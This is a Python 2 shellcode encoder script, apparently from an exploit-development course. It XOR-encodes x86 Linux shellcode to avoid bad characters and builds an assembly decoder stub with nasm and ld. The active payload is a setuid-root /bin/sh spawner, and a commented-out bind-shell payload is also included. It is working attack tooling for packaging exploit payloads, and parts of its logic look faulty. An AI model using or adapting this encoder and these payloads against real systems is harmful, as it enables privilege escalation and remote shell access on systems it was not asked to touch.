#!/usr/bin/python
# -*- coding:utf-8 -*-
#; Title Python XOR Shellcode Encoder
#; Author npn <npn at iodigitalsec dot com>
#; License http://creativecommons.org/licenses/by-sa/3.0/
#; Legitimate use and research only
#; This program is distributed in the hope that it will be useful,
#; but WITHOUT ANY WARRANTY; without even the implied warranty of
#; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 
import random
import os
 
#helloworld with nulls
#shellcode = (   "\xe9\x15\x00\x00\x00\x59\x31\xc0\x31\xdb"
#                "\x31\xd2\xb0\x04\xb3\x01\xb2\x0d\xcd\x80"
#                "\xb0\x01\xb3\x01\xcd\x80\xe8\xe6\xff\xff"
#                "\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72"
#                "\x6c\x64\x21\x0a")

shellcode = ("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                              "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                              "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")
#bindshell without nulls
#shellcode = (  "\x31\xdb\xf7\xe3\xb0\x66\x53\xfe\xc3\x53"
#               "\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66"
#               "\x58\x5b\x5e\x66\x68\x0d\xf0\x66\x53\x89"
#               "\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a"
#               "\x66\x58\x01\xdb\x6a\x01\x57\x89\xe1\xcd"
#               "\x80\x6a\x66\x58\x43\x31\xd2\x52\x52\x57"
#               "\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0"
#               "\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
#               "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
#               "\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
#               "\x80")
 
badchars = (["\xcd", "\xe8","\xdb"])
 
#---#
 
def psc(thisshellcode):
        encoded = ""
        for x in bytearray(thisshellcode):
                encoded += '\\x%02x' % x
        print encoded
        encoded = ""
 
def mknop(n, nops):
#       if not random.randint(0,n):
#               return '\n'.join(random.choice(nops)) + "\n"
#       else:
                return ""
#print "Starting Set length: " + repr(len(allowedxors))
#step1
 
def runencoder():
        thisshellcode = shellcode
        allowedxors = (["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c",
                        "\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18",
                        "\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24",
                        "\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30",
                        "\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c",
                        "\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48",
                        "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54",
                        "\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60",
                        "\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c",
                        "\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78",
                        "\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84",
                        "\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90",
                        "\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",
                        "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8",
                        "\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4",
                        "\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0",
                        "\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc",
                        "\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8",
                        "\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4",
                        "\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
                        "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc",
                        "\xfd","\xfe","\xff"])
        for b in badchars:
                if b in allowedxors:
                        allowedxors.remove(b)
 
        #does shellcode contain nulls?
        #I hope not!
        nulls = 0
        for x in bytearray(thisshellcode):
                if chr(x) == "\x00":
                        nulls = 1
        if nulls == 0:
                ourxor = ""
                thisshellcode = thisshellcode + "\x00"
        else:
                #we got nulls 
                ourxor = ord(random.choice(allowedxors)) # 从allowdxors中随机选择一个元素，ord获取字符的ASCII或者UNICODE数值
                allowedxors.remove(chr(ourxor))
 
        #step1 cascading additive xor with known end byte
        myallowedxors = list(allowedxors)
        random.shuffle(myallowedxors) # 将myallowedxors中的所有元素打乱
        loopctr=1
        # 利用allowedxors中的字符来异或shellcode，并检查是否有badchar
        for ax in myallowedxors:
                b = bytearray()    # 创建一个字节数组，保存异或之后的shellcode
                lastbyte = ord(ax) # 获取字符的ASCII数值
                b.append(lastbyte) #
                badchar = 0
                for x in bytearray(thisshellcode):
                        thisbyte = x^lastbyte
                        if chr(thisbyte) in badchars:
                                badchar = 1
                                break
                        b.append(thisbyte)
                        lastbyte = thisbyte
                if badchar == 1:
                        loopctr=loopctr+1
                else:
                        print "Good byte: " + '\\x%02x' % lastbyte
                        break
        if badchar == 1:
                print "No bytes left(3)"
                quit()
        #print ";Succeeded on %d of %d" % (loopctr, len(allowedxors))
        if nulls == 1:
                #we got nulls
                b.append(ourxor)
 
        thisshellcode = b
        #step2 put it together
        encoded = ""
        encoded2 = ""
        for x in bytearray(thisshellcode):
                encoded += '\\x%02x' % x
                encoded2 += '0x%02x,' % x
        print encoded
        print "encoded length = " + str(len(encoded))
 
        #print encoded
        #print encoded2
        #print ';Len: %d' % (len(encoded)/4) + "\n"
 
        head = 'global _start' + "\n" + "\n" +  '_start:' + "\n"
        fabs = 'fabs'+ '\n' + 'fnstenv [esp-0xc]' + '\n' + 'pop edx' +'\n'+ 'add dl, 0x14'+'\n'
        short_xor_beg = 'short_xor_beg:\n' + 'xor ecx,ecx\n' +'mov cl, 0x18\n'
        short_xor_xor = 'short_xor_xor:\n' + 'xor byte [edx], 0x00\n' +'inc edx\n' + 'loop short_xor_xor\n'
 
        sc = 'shellcode: db ' + encoded2 + "\n"
        out = head + fabs + short_xor_beg + short_xor_xor + sc
        f = open('/tmp/sc.asm', 'w')
        f.write(out)
        f.close()
        os.system("/usr/bin/nasm -f elf32 -o /tmp/sc.o /tmp/sc.asm")
        os.system("/usr/bin/nasm -f bin -o /tmp/sc.bin /tmp/sc.asm ")
        os.system("/usr/bin/ld -m elf_i386 -o /tmp/sc /tmp/sc.o")
 
        f = open('/tmp/sc.bin', 'r')
        fsc = f.read()
        f.close()
      #  os.system("rm /tmp/sc /tmp/sc.bin /tmp/sc.asm /tmp/sc.o")
        return (ourxor, nulls, fsc)
(ourxor, nulls, fsc) = runencoder()
fin = 0
tryctr = 1
trylim = 255
while fin != 1 and tryctr < trylim:
        fin = 0
        ourxorctr = 0
        bad = 0
        for x in bytearray(fsc):
                if chr(x) in badchars:
                        bad = 1
                if nulls == 1:
                        if x == int(ourxor,16):
                                ourxorctr = ourxorctr + 1
        if ourxorctr > 2:
                bad = 1
        if bad == 0:
                fin = 1
        else:
                bad = 0
                (ourxor, nulls, fsc) = runencoder()
                tryctr = tryctr + 1
if tryctr == trylim:
        print "FAILED after: %d rounds" % trylim
else:
        print "Completed in: %d rounds" % tryctr
print "Original Len: %d" % len(shellcode)
print "Finished Len: %d" % len(fsc)
sc = ""
asm = ""
for x in bytearray(fsc):
        sc += '\\x'
        sc += '%02x' % x
        asm += '0x'
        asm += '%02x,' % x
print sc
print asm
